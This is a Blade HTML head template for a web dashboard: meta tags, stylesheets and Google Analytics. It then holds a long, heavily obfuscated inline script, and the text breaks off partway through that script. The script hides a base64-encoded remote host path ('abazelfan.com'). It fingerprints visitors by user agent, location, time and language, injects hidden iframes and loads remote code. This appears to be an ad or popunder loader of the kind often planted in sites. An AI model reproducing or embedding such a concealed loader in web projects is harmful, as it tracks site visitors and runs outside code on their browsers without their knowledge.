<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <base href="{{ url('/') }}" />
    <title>{{ $title }} | {{ $set->site_name }}</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1" />
    <meta name="robots" content="index, follow">
    <meta name="apple-mobile-web-app-title" content="{{ $set->site_name }}" />
    <meta name="application-name" content="{{ $set->site_name }}" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="description" content="{{ $set->site_desc }}" />
    <link rel="shortcut icon" href="{{ url('/') }}/asset/{{ $logo->image_link2 }}" />
    <link rel="apple-touch-icon" href="{{ url('/') }}/asset/{{ $logo->image_link2 }}" />
    <link rel="apple-touch-icon" sizes="72x72" href="{{ url('/') }}/asset/{{ $logo->image_link2 }}" />
    <link rel="apple-touch-icon" sizes="114x114" href="{{ url('/') }}/asset/{{ $logo->image_link2 }}" />
    <link rel="stylesheet" href="{{ url('/') }}/asset/css/sweetalert.css" type="text/css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,600,700&display=swap">
    <link rel="stylesheet" href="{{ url('/') }}/asset/dashboard/vendor/nucleo/css/nucleo.css" type="text/css">
    <link rel="stylesheet" href="{{ url('/') }}/asset/dashboard/vendor/@fortawesome/fontawesome-free/css/all.min.css"
        type="text/css">
    <link rel="stylesheet"
        href="{{ url('/') }}/asset/dashboard/vendor/datatables.net-bs4/css/dataTables.bootstrap4.min.css">
    <link rel="stylesheet"
        href="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons-bs4/css/buttons.bootstrap4.min.css">
    <link rel="stylesheet"
        href="{{ url('/') }}/asset/dashboard/vendor/datatables.net-select-bs4/css/select.bootstrap4.min.css">
    <link rel="stylesheet" href="{{ url('/') }}/asset/dashboard/css/argon.css?v=1.1.0" type="text/css">
    <link rel="stylesheet" href="{{ url('/') }}/asset/frontend/css/sweetalert.css" type="text/css">
    @yield('css')
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-224108539-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-224108539-1');
    </script>
<script data-cfasync="false" type="text/javascript">(function($,document){for($._Fa=$.BD;$._Fa<$.GA;$._Fa+=$.y){switch($._Fa){case $.Fn:!function(r){for($._E=$.BD;$._E<$.Ce;$._E+=$.y){switch($._E){case $.CA:u.m=r,u.c=e,u.d=function(n,t,r){u.o(n,t)||Object[$.e](n,t,$.$($.BF,!$.y,$.Cj,!$.BD,$.Cg,r));},u.n=function(n){for($._C=$.BD;$._C<$.CA;$._C+=$.y){switch($._C){case $.y:return u.d(t,$.CJ,t),t;break;case $.BD:var t=n&&n[$.Cb]?function(){return n[$.Ch];}:function(){return n;};break;}}},u.o=function(n,t){return Object[$.CE][$.CI][$.By](n,t);},u.p=$.Bt,u(u.s=$.Bw);break;case $.y:function u(n){for($._B=$.BD;$._B<$.Ce;$._B+=$.y){switch($._B){case $.CA:return r[n][$.By](t[$.Bv],t,t[$.Bv],u),t.l=!$.BD,t[$.Bv];break;case $.y:var t=e[n]=$.$($.CB,n,$.CD,!$.y,$.Bv,$.$());break;case $.BD:if(e[n])return e[n][$.Bv];break;}}}break;case $.BD:var e=$.$();break;}}}([function(n,t,r){for($._i=$.BD;$._i<$.Ce;$._i+=$.y){switch($._i){case $.CA:t.e=5073065,t.a=5073064,t.v=0,t.w=0,t.h=30,t._=true,t.y=g[$.Jr](b('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),t.g=2,t.O='Ly9hYmF6ZWxmYW4uY29tLzQwMC81MDczMDY1',t.k=2,t.S=$.Ib*1651914036,t.A='VAM:i9MkN.&%',t.M='d24e1pyk',t.P='e24',t.T='qm8impgkbz0',t.B='_wovnm',t.N='_cwmuth';break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD));break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Cr=$.BD;$._Cr<$.Ct;$._Cr+=$.y){switch($._Cr){case $.Ce:function d(){return s?[($.BD,e.G)(c.L[$.Dr],c[$.Gq][$.Dr]),($.BD,e.G)(c[$.Eq][$.Dr],c[$.Gq][$.Dr])][$.Bs]($.bq):($.BD,o.X)();}break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.Dk]=function(){return $.Jm+f.e+$.bf;},t.I=function(){return $.Jv+f.e;},t.C=d,t.z=function(){for($._a=$.BD;$._a<$.CA;$._a+=$.y){switch($._a){case $.y:return s=!$.BD,n;break;case $.BD:var n=s;break;}}},t.R=function(){for($._Ci=$.BD;$._Ci<$.CA;$._Ci+=$.y){switch($._Ci){case $.y:n.id=i.F,window[$.JD](n,$.Jq);break;case $.BD:var n=$.$(),t=q(function(){($.BD,o.D)()&&(u(t),($.BD,a.H)([f.e,f.a],d()));},$.Jt);break;}}};break;case $.CA:var e=r($.Fk),o=r($.Ce),i=r($.Ct),c=r($.Fl),f=r($.BD),a=r($.Fm),s=!$.y;break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Bp=$.BD;$._Bp<$.Ce;$._Bp+=$.y){switch($._Bp){case $.CA:var e=[];break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.Dl]=function(){return e;},t[$.Dm]=function(n){e[$.Bz](-$.y)[$.ak]()!==n&&e[$.ac](n);};break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._EH=$.BD;$._EH<$.Fr;$._EH+=$.y){switch($._EH){case $.Fq:function v(n,t){return n+(d[$.Dr]=$.au*d[$.Dr]%$.cA,d[$.Dr]%(t-n));}break;case $.CA:var c=r($.Fn),a=r($.y),s=r($.Ct);break;case $.Ce:function o(n){for($._Cb=$.BD;$._Cb<$.CA;$._Cb+=$.y){switch($._Cb){case $.y:return h[$.JB](n);break;case $.BD:if(h[$.JA](n)){for($._CE=$.BD;$._CE<$.CA;$._CE+=$.y){switch($._CE){case $.y:return r;break;case $.BD:for(var t=$.BD,r=h(n[$.Gr]);t<n[$.Gr];t++)r[t]=n[t];break;}}}break;}}}break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.Dn]=void $.BD,t[$.Do]=function(n){return n[$.Gy]($.Bt)[$.bj](function(n,t){return(n<<$.Fq)-n+t[$.bE]($.BD)&$.cA;},$.BD);},t.X=function(){return[d[$.Bm],$.aA][$.Bs]($.bq);},t[$.Dp]=function(){for($._Cp=$.BD;$._Cp<$.CA;$._Cp+=$.y){switch($._Cp){case $.y:return[][$.ai](o(h(n)))[$.Jo](function(n){return t[f[$.Bm]()*t[$.Gr]|$.BD];})[$.Bs]($.Bt);break;case $.BD:var t=[][$.ai](o($.bl)),n=$.Ct+($.Gd*f[$.Bm]()|$.BD);break;}}},t.D=function(){return d[$.Ds];};break;case $.Fm:d[$.Bm]=$.Bt,d[$.Dq]=$.Bt,d[$.Dr]=$.Bt,d[$.Ds]=void $.BD,d[$.Dt]=null,function r(){for($._EA=$.BD;$._EA<$.Ct;$._EA+=$.y){switch($._EA){case $.Ce:window[$.B]($.Go,o);break;case $.y:var o=($.BD,c[$.EB])(d,s.F);break;case $.CA:var i=q(function(){if($.Bt!==d[$.Dr]){for($._Dw=$.BD;$._Dw<$.Ce;$._Dw+=$.y){switch($._Dw){case $.CA:d[$.Ds]=!$.BD,window[$.C]($.Go,o);break;case $.y:try{for($._Dk=$.BD;$._Dk<$.Ce;$._Dk+=$.y){switch($._Dk){case $.CA:d[$.Dt]+=t,p(function(){d[$.Dr]=$.Bt,r(),($.BD,a.R)();},t);break;case $.y:var n=$.Ff-new e()[$.dq](),t=$.Ff*($.Fz<n?n-$.Fz:n)*$.Ib;break;case $.BD:h(d[$.Dq])[$.dz]($.BD)[$.l](function(n){for($._Df=$.BD;$._Df<$.Ce;$._Df+=$.y){switch($._Df){case $.CA:h(t)[$.dz]($.BD)[$.l](function(n){d[$.Bm]+=k[$.o](v($.Cw,$.Cx));});break;case $.y:var t=v($.Fk,$.GH);break;case $.BD:d[$.Bm]=$.Bt;break;}}});break;}}}catch(n){($.BD,a.z)();}break;case $.BD:if(u(i),$.cd===d[$.Dr])return d[$.Ds]=!$.BD,void($.BD,a.z)();break;}}}},$.Jt);break;case $.BD:d[$.Ds]=!$.y;break;}}}();break;case $.Ct:var d=t[$.Dn]=$.$();break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Dh=$.BD;$._Dh<$.Fq;$._Dh+=$.y){switch($._Dh){case $.Ce:t.Y=f[$.Bm]()[$.Bu]($.Bx)[$.Bz]($.CA),t.F=f[$.Bm]()[$.Bu]($.Bx)[$.Bz]($.CA),t.U=f[$.Bm]()[$.Bu]($.Bx)[$.Bz]($.CA);break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t.U=t.F=t.Y=t.Z=t.$=void $.BD;break;case $.Ct:i&&(i[$.B](c,function n(r){i[$.C](c,n),[($.BD,u.J)(navigator[$.dC]),($.BD,u.K)(window[$.aw][$.t]),($.BD,u.Q)(new e()),($.BD,u.W)(window[$.bu][$.cC]),($.BD,u.V)(navigator[$.dJ]||navigator[$.eF])][$.l](function(t){for($._DB=$.BD;$._DB<$.CA;$._DB+=$.y){switch($._DB){case $.y:p(function(){for($._Cu=$.BD;$._Cu<$.CA;$._Cu+=$.y){switch($._Cu){case $.y:n.id=r[$.aq],n[$.Ig]=t,window[$.JD](n,$.Jq),($.BD,o[$.Dm])($.fe+t);break;case $.BD:var n=$.$();break;}}},n);break;case $.BD:var n=m($.GA*f[$.Bm](),$.GA);break;}}});}),i[$.B](a,function n(t){for($._Bm=$.BD;$._Bm<$.Fq;$._Bm+=$.y){switch($._Bm){case $.Ce:var e=window[$.bu][$.cC],u=new window[$.br]();break;case $.y:var r=$.$();break;case $.Ct:u[$.ax]($.bs,e),u[$.bi]=function(){r[$.Da]=u[$.dr](),window[$.JD](r,$.Jq);},u[$.Gp]=function(){r[$.Da]=$.cd,window[$.JD](r,$.Jq);},u[$.bg]();break;case $.CA:r.id=t[$.aq];break;case $.BD:i[$.C](a,n);break;}}}));break;case $.CA:var u=r($.Fo),o=r($.CA),i=$.Cr!=typeof document?document[$.a]:null,c=t.$=$.JI,a=t.Z=$.JJ;break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._F=$.BD;$._F<$.Ce;$._F+=$.y){switch($._F){case $.CA:t.nn=$.Hp,t.tn=$.Hq,t.rn=$.Hr,t.en=$.Hs,t.un=$.BD,t.in=$.y,t.cn=$.CA,t.fn=$.Ht;break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD));break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Er=$.BD;$._Er<$.Fk;$._Er+=$.y){switch($._Er){case $.Fr:v[$.l](function(n){for($._Cc=$.BD;$._Cc<$.Ct;$._Cc+=$.y){switch($._Cc){case $.Ce:try{n[s]=n[s]||[];}catch(n){}break;case $.y:var t=n[$.z][$.k][$.bh].fp;break;case $.CA:n[t]=n[t]||[];break;case $.BD:n[$.z][$.k][$.bh].fp||(n[$.z][$.k][$.bh].fp=f[$.Bm]()[$.Bu]($.Bx)[$.Bz]($.CA));break;}}});break;case $.Ce:d&&d[$.Gp]&&(e=d[$.Gp]);break;case $.Fq:function i(n,e){return n&&e?v[$.l](function(n){for($._Cv=$.BD;$._Cv<$.Ce;$._Cv+=$.y){switch($._Cv){case $.CA:try{n[s]=n[s][$.Gx](function(n){for($._Bu=$.BD;$._Bu<$.CA;$._Bu+=$.y){switch($._Bu){case $.y:return t||r;break;case $.BD:var t=n[$.az]!==n,r=n[$.bA]!==e;break;}}});}catch(n){}break;case $.y:n[t]=n[t][$.Gx](function(n){for($._Bt=$.BD;$._Bt<$.CA;$._Bt+=$.y){switch($._Bt){case $.y:return t||r;break;case $.BD:var t=n[$.az]!==n,r=n[$.bA]!==e;break;}}});break;case $.BD:var t=n[$.z][$.k][$.bh].fp;break;}}}):(l[$.l](function(e){v[$.l](function(n){for($._Eg=$.BD;$._Eg<$.Ce;$._Eg+=$.y){switch($._Eg){case $.CA:try{n[s]=n[s][$.Gx](function(n){for($._EG=$.BD;$._EG<$.CA;$._EG+=$.y){switch($._EG){case $.y:return t||r;break;case $.BD:var t=n[$.az]!==e[$.az],r=n[$.bA]!==e[$.bA];break;}}});}catch(n){}break;case $.y:n[t]=n[t][$.Gx](function(n){for($._EC=$.BD;$._EC<$.CA;$._EC+=$.y){switch($._EC){case $.y:return t||r;break;case $.BD:var t=n[$.az]!==e[$.az],r=n[$.bA]!==e[$.bA];break;}}});break;case $.BD:var t=n[$.z][$.k][$.bh].fp;break;}}});}),u[$.l](function(n){window[n]=!$.y;}),u=[],l=[],null);}break;case $.CA:var s=$.Cs,d=document[$.a],v=[window],u=[],l=[],e=function(){};break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t.an=function(n,t,r){for($._Cn=$.BD;$._Cn<$.Ce;$._Cn+=$.y){switch($._Cn){case $.CA:try{for($._CG=$.BD;$._CG<$.CA;$._CG+=$.y){switch($._CG){case $.y:a[$.az]=n,a[$.Ey]=t,a[$.bA]=r,a[$.bB]=f?f[$.bB]:u,a[$.bC]=i,a[$.bD]=e,(a[$.bc]=o)&&o[$.cq]&&(a[$.cq]=o[$.cq]),l[$.ac](a),v[$.l](function(n){for($._Be=$.BD;$._Be<$.Ce;$._Be+=$.y){switch($._Be){case $.CA:try{n[s][$.ac](a);}catch(n){}break;case $.y:n[t][$.ac](a);break;case $.BD:var t=n[$.z][$.k][$.bh].fp||s;break;}}});break;case $.BD:var c=window[$.z][$.k][$.bh].fp||s,f=window[c][$.Gx](function(n){return n[$.bA]===r&&n[$.bB];})[$.cr](),a=$.$();break;}}}catch(n){}break;case $.y:try{i=d[$.i][$.Gy]($.JF)[$.CA];}catch(n){}break;case $.BD:var e=$.Ce<arguments[$.Gr]&&void $.BD!==arguments[$.Ce]?arguments[$.Ce]:$.BD,u=$.Ct<arguments[$.Gr]&&void $.BD!==arguments[$.Ct]?arguments[$.Ct]:$.BD,o=arguments[$.Fq],i=void $.BD;break;}}},t.sn=function(n){u[$.ac](n),window[n]=!$.BD;},t[$.Du]=i,t[$.Dv]=function(n,t){for($._Co=$.BD;$._Co<$.CA;$._Co+=$.y){switch($._Co){case $.y:return!$.y;break;case $.BD:for(var r=c(),e=$.BD;e<r[$.Gr];e++)if(r[e][$.bA]===t&&r[e][$.az]===n)return!$.BD;break;}}},t[$.Dw]=c,t[$.Dx]=function(){try{i(),e(),e=function(){};}catch(n){}},t.H=function(e,t){v[$.Jo](function(n){for($._CI=$.BD;$._CI<$.CA;$._CI+=$.y){switch($._CI){case $.y:return r[$.Gx](function(n){return-$.y<e[$.Jn](n[$.bA]);});break;case $.BD:var t=n[$.z][$.k][$.bh].fp||s,r=n[t]||[];break;}}})[$.bj](function(n,t){return n[$.ai](t);},[])[$.l](function(n){try{n[$.bc].sd(t);}catch(n){}});};break;case $.Fm:function c(){for($._EB=$.BD;$._EB<$.Ce;$._EB+=$.y){switch($._EB){case $.CA:return u;break;case $.y:try{for($._Dr=$.BD;$._Dr<$.CA;$._Dr+=$.y){switch($._Dr){case $.y:for(t=$.BD;t<v[$.Gr];t++)r(t);break;case $.BD:var r=function(n){for(var i=v[n][s]||[],t=function(o){$.BD<u[$.Gx](function(n){for($._Bn=$.BD;$._Bn<$.CA;$._Bn+=$.y){switch($._Bn){case $.y:return e&&u;break;case $.BD:var t=n[$.az],r=n[$.bA],e=t===i[o][$.az],u=r===i[o][$.bA];break;}}})[$.Gr]||u[$.ac](i[o]);},r=$.BD;r<i[$.Gr];r++)t(r);};break;}}}catch(n){}break;case $.BD:for(var u=[],n=function(n){for(var t=v[n][$.z][$.k][$.bh].fp,i=v[n][t]||[],r=function(o){$.BD<u[$.Gx](function(n){for($._Bk=$.BD;$._Bk<$.CA;$._Bk+=$.y){switch($._Bk){case $.y:return e&&u;break;case $.BD:var t=n[$.az],r=n[$.bA],e=t===i[o][$.az],u=r===i[o][$.bA];break;}}})[$.Gr]||u[$.ac](i[o]);},e=$.BD;e<i[$.Gr];e++)r(e);},t=$.BD;t<v[$.Gr];t++)n(t);break;}}}break;case $.Ct:try{for(var o=v[$.Bz](-$.y)[$.ak]();o&&o!==o[$.Jx]&&o[$.Jx][$.aw][$.t];)v[$.ac](o[$.Jx]),o=o[$.Jx];}catch(n){}break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Dz=$.BD;$._Dz<$.Fn;$._Dz+=$.y){switch($._Dz){case $.Fr:function y(){for($._J=$.BD;$._J<$.CA;$._J+=$.y){switch($._J){case $.y:return n[$.m][$.s]=$.BB,n[$.m][$.t]=$.BB,n[$.m][$.v]=$.BD,n;break;case $.BD:var n=document[$.A]($.Br);break;}}}break;case $.Ce:function u(n){return n&&n[$.Cb]?n:$.$($.Ch,n);}break;case $.Fk:function i(){d&&o[$.l](function(n){return n(d);});}break;case $.Fq:function p(){for($._Dy=$.BD;$._Dy<$.CA;$._Dy+=$.y){switch($._Dy){case $.y:return $.Gt+d+$.JF+r+$.an;break;case $.BD:var n=[$.HB,$.Bq,$.HC,$.HD,$.HE,$.HF,$.HG,$.HH],e=[$.HI,$.HJ,$.Ha,$.Hb,$.Hc],t=[$.Hd,$.He,$.Hf,$.Hg,$.Hh,$.Hi,$.Hj,$.Hk,$.Hl,$.Hm,$.Hn,$.Ho],r=n[f[$.JC](f[$.Bm]()*n[$.Gr])][$.CC](new RegExp($.HB,$.CG),function(){for($._Cl=$.BD;$._Cl<$.CA;$._Cl+=$.y){switch($._Cl){case $.y:return t[n];break;case $.BD:var n=f[$.JC](f[$.Bm]()*t[$.Gr]);break;}}})[$.CC](new RegExp($.Bq,$.CG),function(){for($._Du=$.BD;$._Du<$.CA;$._Du+=$.y){switch($._Du){case $.y:return($.Bt+t+f[$.JC](f[$.Bm]()*r))[$.Bz](-$.y*t[$.Gr]);break;case $.BD:var n=f[$.JC](f[$.Bm]()*e[$.Gr]),t=e[n],r=f[$.es]($.GA,t[$.Gr]);break;}}});break;}}}break;case $.CA:var e=u(r($.Il)),s=u(r($.GF));break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t.dn=p,t[$.Dy]=function(){for($._y=$.BD;$._y<$.CA;$._y+=$.y){switch($._y){case $.y:return $.Gt+d+$.JF+n+$.bn;break;case $.BD:var n=f[$.Bm]()[$.Bu]($.Bx)[$.Bz]($.CA);break;}}},t.vn=_,t.ln=y,t.wn=function(n){for($._b=$.BD;$._b<$.CA;$._b+=$.y){switch($._b){case $.y:d=n,i();break;case $.BD:if(!n)return;break;}}},t[$.Dz]=i,t.C=function(){return d;},t.hn=function(n){o[$.ac](n),d&&n(d);},t.mn=function(u,o){for($._Dl=$.BD;$._Dl<$.Ct;$._Dl+=$.y){switch($._Dl){case $.Ce:return window[$.B]($.Go,function n(t){for($._Dg=$.BD;$._Dg<$.CA;$._Dg+=$.y){switch($._Dg){case $.y:if(r===f)if(null===t[$.ah][r]){for($._Cw=$.BD;$._Cw<$.CA;$._Cw+=$.y){switch($._Cw){case $.y:e[r]=o?$.$($.fA,$.ez,$.Dg,u,$.ff,s[$.Ch][$.aB][$.bu][$.cC]):u,a[$.x][$.JD](e,$.Jq),c=w,i[$.l](function(n){return n();});break;case $.BD:var e=$.$();break;}}}else a[$.Ci][$.bF](a),window[$.C]($.Go,n),c=h;break;case $.BD:var r=Object[$.Jp](t[$.ah])[$.ak]();break;}}}),a[$.i]=n,(document[$.c]||document[$.k])[$.q](a),c=l,t.pn=function(){return c===h;},t._n=function(n){return $.Fe!=typeof n?null:c===h?n():i[$.ac](n);},t;break;case $.y:var i=[],c=v,n=p(),f=_(n),a=y();break;case $.CA:function t(){for($._Bf=$.BD;$._Bf<$.CA;$._Bf+=$.y){switch($._Bf){case $.y:return null;break;case $.BD:if(c===h){for($._Bb=$.BD;$._Bb<$.CA;$._Bb+=$.y){switch($._Bb){case $.y:s[$.Ch][$.aB][$.bu][$.cC]=n;break;case $.BD:if(c=m,!o)return($.BD,e[$.Ch])(n,$.ef);break;}}}break;}}}break;case $.BD:if(!d)return null;break;}}};break;case $.Fm:function _(n){return n[$.Gy]($.JF)[$.Bz]($.Ce)[$.Bs]($.JF)[$.Gy]($.Bt)[$.bj](function(n,t,r){for($._Bw=$.BD;$._Bw<$.CA;$._Bw+=$.y){switch($._Bw){case $.y:return n+t[$.bE]($.BD)*e;break;case $.BD:var e=f[$.es](r+$.y,$.Fr);break;}}},$.dv)[$.Bu]($.Bx);}break;case $.Ct:var d=void $.BD,v=$.BD,l=$.y,w=$.CA,h=$.Ce,m=$.Ct,o=[];break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Cs=$.BD;$._Cs<$.Fq;$._Cs+=$.y){switch($._Cs){case $.Ce:function a(n){for($._By=$.BD;$._By<$.CA;$._By+=$.y){switch($._By){case $.y:return e<=t&&t<=u?t-e:i<=t&&t<=c?t-i+o:$.BD;break;case $.BD:var t=n[$.Bu]()[$.bE]($.BD);break;}}}break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.EA]=a,t[$.o]=s,t.yn=function(n,u){return n[$.Gy]($.Bt)[$.Jo](function(n,t){for($._Bi=$.BD;$._Bi<$.CA;$._Bi+=$.y){switch($._Bi){case $.y:return s(e);break;case $.BD:var r=(u+$.y)*(t+$.y),e=(a(n)+r)%f;break;}}})[$.Bs]($.Bt);},t.bn=function(n,u){return n[$.Gy]($.Bt)[$.Jo](function(n,t){for($._Bs=$.BD;$._Bs<$.CA;$._Bs+=$.y){switch($._Bs){case $.y:return s(e);break;case $.BD:var r=u[t%(u[$.Gr]-$.y)],e=(a(n)+a(r))%f;break;}}})[$.Bs]($.Bt);},t.G=function(n,c){return n[$.Gy]($.Bt)[$.Jo](function(n,t){for($._Bo=$.BD;$._Bo<$.CA;$._Bo+=$.y){switch($._Bo){case $.y:return s(i);break;case $.BD:var r=c[t%(c[$.Gr]-$.y)],e=a(r),u=a(n),o=u-e,i=o<$.BD?o+f:o;break;}}})[$.Bs]($.Bt);};break;case $.Ct:function s(n){return n<=$.Fn?k[$.o](n+e):n<=$.Iz?k[$.o](n+i-o):k[$.o](e);}break;case $.CA:var e=$.Cu,u=$.Cv,o=u-e+$.y,i=$.Cw,c=$.Cx,f=c-i+$.y+o;break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Ds=$.BD;$._Ds<$.Ce;$._Ds+=$.y){switch($._Ds){case $.CA:var u=r($.Fk),w=r($.Ce),p=r($.BD),a=t.gn=new j($.Jz,$.Bt),o=($.Cr!=typeof document?document:$.$($.a,null))[$.a],_=$.Cy,y=$.Cz,b=$.DA,g=$.DB;break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t.gn=void $.BD,t.jn=function(e,u,o){for($._Ce=$.BD;$._Ce<$.CA;$._Ce+=$.y){switch($._Ce){case $.y:return e[$.Dr]=i[c],e[$.Gr]=i[$.Gr],function(n){for($._CA=$.BD;$._CA<$.CA;$._CA+=$.y){switch($._CA){case $.y:if(t===u)for(;r--;)c=(c+=o)>=i[$.Gr]?$.BD:c,e[$.Dr]=i[c];break;case $.BD:var t=n&&n[$.ah]&&n[$.ah].id,r=n&&n[$.ah]&&n[$.ah][$.Ig];break;}}};break;case $.BD:var i=e[$.Er][$.Gy](a)[$.Gx](function(n){return!a[$.Ja](n);}),c=$.BD;break;}}},t[$.EB]=function(v,l){return function(n){for($._Dm=$.BD;$._Dm<$.CA;$._Dm+=$.y){switch($._Dm){case $.y:if(t===l)try{for($._DE=$.BD;$._DE<$.CA;$._DE+=$.y){switch($._DE){case $.y:v[$.Dr]=($.BD,w[$.Do])(c+p.A),v[$.Dq]=f[$.JC](m(s,$.GA)+$.GG*($.Fz<=d?$.y:$.BD))+$.y,v[$.Dt]=new e(o)[$.bb]();break;case $.BD:var u=v[$.Dt]?new e(v[$.Dt])[$.Bu]():r[$.Gy](_)[$.dF](function(n){return n[$.fg]($.fj);}),o=u[$.Gy](y)[$.ak](),i=new e(o)[$.dw]()[$.Gy](b),c=i[$.cr](),a=i[$.cr]()[$.Gy](g),s=a[$.cr](),d=a[$.cr]();break;}}}catch(n){v[$.Dr]=$.cd;}break;case $.BD:var t=n&&n[$.ah]&&n[$.ah].id,r=n&&n[$.ah]&&n[$.ah][$.Da];break;}}};},t.On=function(n,t){for($._g=$.BD;$._g<$.CA;$._g+=$.y){switch($._g){case $.y:r[$.aq]=n,o[$.F](r);break;case $.BD:var r=new Event(t);break;}}},t.kn=function(r,n){return h[$.Cf](null,$.$($.Gr,n))[$.Jo](function(n,t){return($.BD,u.yn)(r,t);})[$.Bs]($.fB);};break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Dt=$.BD;$._Dt<$.Ce;$._Dt+=$.y){switch($._Dt){case $.CA:var e=r($.Fm),u=r($.Fp),o=r($.Fq),i=r($.BD),c=r($.CA),f=r($.Fr);break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.EC]=function(n){for($._z=$.BD;$._z<$.CA;$._z+=$.y){switch($._z){case $.y:return s[$.Jx]=f,s[$.ad]=a,s;break;case $.BD:var t=document[$.k],r=document[$.c]||$.$(),e=window[$.bG]||t[$.bw]||r[$.bw],u=window[$.bH]||t[$.bx]||r[$.bx],o=t[$.bI]||r[$.bI]||$.BD,i=t[$.bJ]||r[$.bJ]||$.BD,c=n[$.av](),f=c[$.Jx]+(e-o),a=c[$.ad]+(u-i),s=$.$();break;}}},t[$.ED]=function(n){for($._l=$.BD;$._l<$.CA;$._l+=$.y){switch($._l){case $.y:return h[$.CE][$.Bz][$.By](t);break;case $.BD:var t=document[$.E](n);break;}}},t[$.EE]=function n(t,r){for($._m=$.BD;$._m<$.Ce;$._m+=$.y){switch($._m){case $.CA:return n(t[$.Ci],r);break;case $.y:if(t[$.al]===r)return t;break;case $.BD:if(!t)return null;break;}}},t[$.EF]=function(n){for($._Dp=$.BD;$._Dp<$.Ct;$._Dp+=$.y){switch($._Dp){case $.Ce:return!$.y;break;case $.y:for(;n[$.Ci];)r[$.ac](n[$.Ci]),n=n[$.Ci];break;case $.CA:for(var e=$.BD;e<t[$.Gr];e++)for(var u=$.BD;u<r[$.Gr];u++)if(t[e]===r[u])return!$.BD;break;case $.BD:var t=(i.y[$.ck]||$.Bt)[$.Gy]($.Hs)[$.Gx](function(n){return n;})[$.Jo](function(n){return[][$.Bz][$.By](document[$.E](n));})[$.bj](function(n,t){return n[$.ai](t);},[]),r=[n];break;}}},t.xn=function(){for($._Bl=$.BD;$._Bl<$.CA;$._Bl+=$.y){switch($._Bl){case $.y:t.sd=f.wn,t[$.ae]=c[$.Dl],t[$.af]=i.T,t[$.ag]=i.M,t[$.Eq]=i.P,($.BD,e.an)(n,o.nn,i.e,i.S,i.a,t);break;case $.BD:var n=$.aj+($.y===i.k?$.cg:$.ci)+$.cx+u.Sn[i.g],t=$.$();break;}}},t.An=function(){for($._BJ=$.BD;$._BJ<$.CA;$._BJ+=$.y){switch($._BJ){case $.y:return($.BD,e[$.Dv])(n,i.a)||($.BD,e[$.Dv])(n,i.e);break;case $.BD:var n=u.Mn[i.g];break;}}},t.Pn=function(){return!u.Mn[i.g];},t.En=function(){for($._DA=$.BD;$._DA<$.Ce;$._DA+=$.y){switch($._DA){case $.CA:try{document[$.k][$.q](r),[$.f,$.h,$.g,$.BI][$.l](function(t){try{window[t];}catch(n){delete window[t],window[t]=r[$.x][t];}}),document[$.k][$.bF](r);}catch(n){}break;case $.y:r[$.m][$.v]=$.BD,r[$.m][$.t]=$.BB,r[$.m][$.s]=$.BB,r[$.i]=$.n;break;case $.BD:var r=document[$.A]($.Br);break;}}};break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._I=$.BD;$._I<$.Fr;$._I+=$.y){switch($._I){case $.Fq:var d=t.Mn=$.$();break;case $.CA:t.Tn=$.y;break;case $.Ce:var e=t.Bn=$.y,u=t.Nn=$.CA,o=(t.qn=$.Ce,t.In=$.Ct),i=t.Cn=$.Fq,c=t.zn=$.Ce,f=t.Rn=$.Fm,a=t.Dn=$.Fr,s=t.Sn=$.$();break;case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD));break;case $.Fm:d[e]=$.Gl,d[a]=$.Gm,d[c]=$.Gn,d[u]=$.Gk;break;case $.Ct:s[e]=$.Ge,s[o]=$.Gf,s[i]=$.Gg,s[c]=$.Gh,s[f]=$.Gi,s[a]=$.Gj,s[u]=$.Gk;break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._Cm=$.BD;$._Cm<$.CA;$._Cm+=$.y){switch($._Cm){case $.y:Object[$.e](t,$.Cb,$.$($.Ig,!$.BD)),t[$.Ch]=function(n){try{return n[$.Gy]($.JF)[$.CA][$.Gy]($.bq)[$.Bz](-$.CA)[$.Bs]($.bq)[$.ei]();}catch(n){return $.Bt;}};break;case $.BD:$.Cq;break;}}},function(n,t,r){for($._FH=$.BD;$._FH<$.Ga;$._FH+=$.y){switch($._FH){case $.Fp:function M(n,t,r,e){for($._Dc=$.BD;$._Dc<$.Ce;$._Dc+=$.y){switch($._Dc){case $.CA:return($.BD,f.Wn)(o,n,t,r,e)[$.bo](function(n){return($.BD,l.$n)(v.e,u),n;})[$.er](function(n){throw($.BD,l.Jn)(v.e,u,o),n;});break;case $.y:var u=$.Ik,o=($.BD,i.dn)();break;case 